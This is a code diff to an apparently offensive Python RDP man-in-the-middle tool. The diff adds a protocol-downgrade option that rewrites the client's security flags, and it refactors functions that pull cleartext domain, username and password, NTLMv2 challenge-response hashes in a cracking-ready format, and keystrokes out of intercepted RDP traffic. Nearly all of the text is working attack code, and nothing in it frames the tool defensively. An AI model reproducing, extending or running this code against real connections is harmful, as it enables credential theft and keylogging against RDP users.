@@ -23,6 +23,9 @@ parser.add_argument('-p', '--listen-port', dest='listen_port', type=int,
     default=3389, help="TCP port to listen on (default 3389)")
 parser.add_argument('-b', '--bind-ip', dest='bind_ip', type=str, default="",
     help="IP address to bind the fake service to (default all)")
+parser.add_argument('-g', '--downgrade', dest='downgrade', type=int,
+                    default=3, action="store", choices=[0,1,3],
+    help="downgrade the authentication protocol to this (default 3)")
 parser.add_argument('-c', '--certfile', dest='certfile', type=str,
     required=True, help="path to the certificate file")
 parser.add_argument('-k', '--keyfile', dest='keyfile', type=str,
@@ -35,7 +38,7 @@ parser.add_argument('target_port', type=int, default=3389, nargs='?',
 args = parser.parse_args()
 
 
-def extract_ntlmv2(bytes):
+def extract_ntlmv2(bytes, m):
     # References:
     #  - [MS-NLMP].pdf
     #  - https://www.root9b.com/sites/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf
@@ -57,16 +60,48 @@ def extract_ntlmv2(bytes):
     nt_response = values["ntstruct"][:16]
     jtr_string = values["ntstruct"][16:]
 
+    global server_challenge
     if not 'server_challenge' in globals():
         server_challenge = b"SERVER_CHALLENGE_MISSING"
 
-    return (b"%s::%s:%s:%s:%s" % (
+    return b"%s::%s:%s:%s:%s" % (
                  values["user"],
                  values["domain"],
                  binascii.hexlify(server_challenge),
                  binascii.hexlify(nt_response),
                  binascii.hexlify(jtr_string),
-         )).decode()
+         )
+
+
+def extract_server_challenge(bytes, m):
+    offset = len(m.group())//2+12
+    global server_challenge
+    server_challenge = bytes[offset:offset+8]
+    return b"Server challenge: " + binascii.hexlify(server_challenge)
+
+
+def extract_credentials(bytes, m):
+    domlen, userlen, pwlen = [
+        struct.unpack('>H',
+                      binascii.unhexlify(x)
+                     )[0]
+        for x in m.groups()
+    ]
+    offset = 36
+    domain = bytes[offset:offset+domlen]
+    user = bytes[offset+domlen+2:offset+domlen+2+userlen]
+    pw = bytes[offset+domlen+2+userlen+2:offset+domlen+2+userlen+2+pwlen]
+    #  close();exit(0)
+    return (b"%s\\%s:%s" % (domain, user, pw))
+
+
+def extract_key_press(bytes):
+    event = bytes[-5]
+    key = bytes[-4] # TODO map scancode to ascii
+    if event == 0:
+        return b"Key press:   %d" % key
+    elif event == 192:
+        return b"Key release: %d" % key
 
 
 def parse_rdp(bytes):
@@ -89,55 +124,37 @@ def parse_rdp(bytes):
 #  00000020: 00 00 00 00 00 74 00 65  00 73 00 74 00 00 00 74  .....t.e.s.t...t
 #  00000030: 00 65 00 73 00 74 00 00  00 74 00 65 00 73 00 74  .e.s.t...t.e.s.t
 #  00000040: 00 00 00 00 00 00 00 02  00 14 00 31 00 32 00 37  ...........1.2.7
+
+    result = b""
     # hexlify first because \x0a is a line break and regex works on single
     # lines
-
     cred_regex = b".{16}00..03eb.{6}40.{20}(.{4})(.{4})(.{4})"
     m = re.match(cred_regex, binascii.hexlify(bytes))
     if m:
-        domlen, userlen, pwlen = [
-            struct.unpack('>H',
-                          binascii.unhexlify(x)
-                         )[0]
-            for x in m.groups()
-        ]
-        offset = 36
-        domain = bytes[offset:offset+domlen]
-        user = bytes[offset+domlen+2:offset+domlen+2+userlen]
-        pw = bytes[offset+domlen+2+userlen+2:offset+domlen+2+userlen+2+pwlen]
-        print((b"%s\\%s:%s" % (domain, user, pw)).decode())
-        close();exit(0)
-        return True
+        result = extract_credentials(bytes, m)
 
     cred_regex = b".*%s0002000000" % binascii.hexlify(b"NTLMSSP")
     m = re.match(cred_regex, binascii.hexlify(bytes))
     if m:
-        offset = len(m.group())//2+12
-        global server_challenge
-        server_challenge = bytes[offset:offset+8]
-        print("Server challenge: " + binascii.hexlify(server_challenge).decode())
+        result = extract_server_challenge(bytes, m)
 
     cred_regex = b".*%s0003000000" % binascii.hexlify(b"NTLMSSP")
     m = re.match(cred_regex, binascii.hexlify(bytes))
     if m:
-        print(extract_ntlmv2(bytes))
-
+        result = extract_ntlmv2(bytes, m)
 
     keypress_regex = b"\x03\x00\x001"
     m = re.match(keypress_regex, bytes)
     if m:
-        event = bytes[-5]
-        key = bytes[-4] # TODO map scancode to ascii
-        if event == 0:
-            print("Key press:   %d" % key)
-        elif event == 192:
-            print("Key release: %d" % key)
-        return True
-    keymap_regex = b".*en-us.*" # TODO find keymap definition
-    m = re.match(keymap_regex, bytes)
-    if m:
-        print(b"Keymap: " + bytes)
-    return False
+        result = extract_key_press(bytes)
+
+    #  keymap_regex = b".*en-us.*" # TODO find keymap definition
+    #  m = re.match(keymap_regex, bytes)
+    #  if m:
+    #      result = b"Keymap: " + bytes
+
+    if not result == b"" and not result == None:
+        print("\033[31m%s\033[0m" % result.decode())
 
 #  with open("bytes", 'rb') as f:
 #      bytes = f.read()
@@ -147,21 +164,34 @@ def parse_rdp(bytes):
 def downgrade_auth(bytes):
     cred_regex = b".*..00..00.{8}$"
     m = re.match(cred_regex, binascii.hexlify(bytes))
-    new_value = 3
-    if m and not bytes[-4] == new_value:
-        print("Downgrading authentication options:")
-        result = bytes[:-4] + chr(new_value).encode() + b"\x00\x00\x00"
+    new_value = args.downgrade
+    # Flags:
+    # 0: standard rdp security
+    # 1: TLS ontop of that
+    # 2: CredSSP (NTLMv2 or Kerberos)
+    # 8: CredSSP + Early User Authorization
+    if m and bytes[-4] >= new_value:
+        print("Downgrading authentication options...")
+        result = (
+            bytes[:-7] +
+            b"\x00\x08\x00" +
+            chr(new_value).encode() +
+            b"\x00\x00\x00"
+        )
         dump_data(result, From="Client")
         return result
     return bytes
 
 
-def dump_data(data, From=None):
+def dump_data(data, From=None, Modified=False):
     if args.debug:
+        modified = ""
+        if Modified:
+            modified = " (modified)"
         if From == "Server":
-            print("From server:")
+            print("From server:"+modified)
         elif From == "Client":
-            print("From client:")
+            print("From client:"+modified)
 
         hexdump(data)
 
@@ -170,7 +200,7 @@ def dump_data(data, From=None):
 def handle_cleartext():
     data = local_conn.recv(4096)
     dump_data(data, From="Client")
-    #  data = downgrade_auth(data)
+    data = downgrade_auth(data)
     remote_socket.send(data)
 
     data = remote_socket.recv(4096)
@@ -192,8 +222,10 @@ def enableSSL():
 
 
 def close():
-    local_conn.close()
-    remote_socket.close()
+    if "local_conn" in globals():
+        local_conn.close()
+    if "remote_conn" in globals():
+        remote_socket.close()
     return False
 
 
@@ -243,7 +275,8 @@ def open_sockets():
 def run():
     open_sockets()
     handle_cleartext()
-    enableSSL()
+    if not args.downgrade == 0:
+        enableSSL()
     while True:
         try:
             if not forward_data():
